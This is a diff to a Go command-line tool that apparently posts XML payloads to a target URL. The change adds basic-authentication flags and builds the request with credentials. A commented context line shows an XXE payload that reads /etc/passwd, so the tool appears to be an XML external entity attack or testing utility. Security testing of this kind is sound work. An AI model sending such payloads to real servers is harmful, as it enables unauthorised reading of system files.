@@ -27,6 +27,10 @@ func main() {
 	
 	// Define the version flag
 	version := flag.Bool("version", false, "Print the version number of the tool")
+	
+	// Define the username and password for basic authentication
+	username := flag.String("username", "", "Username for basic authentication")
+	password := flag.String("password", "", "Password for basic authentication")
 
 	// Parse the command line flags
 	flag.Parse()
@@ -45,7 +49,17 @@ func main() {
 // 		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 // 		<foo>&xxe;</foo>
 // 	`
-
+	
+	// Create an HTTP request
+	req, err := http.NewRequest("POST", *url, bytes.NewBuffer([]byte(payload)))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		return
+	}
+	
+	// Set the basic authentication header
+	req.SetBasicAuth(*username, *password)
+	
 	// Create a new HTTP client with the specified timeout
 	client := &http.Client{
 		Timeout: time.Duration(*timeout) * time.Second,
@@ -61,9 +75,10 @@ func main() {
 	}
 
 	// Send the payload to the server using an HTTP POST request
-	resp, err := client.Post(*url, "application/xml", bytes.NewBuffer([]byte(payload)))
+	// Send the request to the server
+	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("Error sending payload:", err)
+		fmt.Println("Error sending request:", err)
 		return
 	}
 	
